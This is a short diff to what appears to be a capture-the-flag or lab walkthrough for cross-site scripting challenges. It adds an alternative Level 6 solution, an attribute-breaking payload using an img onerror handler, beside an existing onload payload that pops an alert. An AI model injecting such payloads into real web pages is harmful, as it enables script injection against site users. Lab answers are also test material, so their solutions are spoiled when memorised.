@@ -133,6 +133,10 @@
 
 6. **Level 6**
     ```
+    "><img src=Defronix onerror=alert(1)>//
+    ```
+    OR  
+    ```
     /images/cat.jpg" onload="alert('THM');
     ```
 
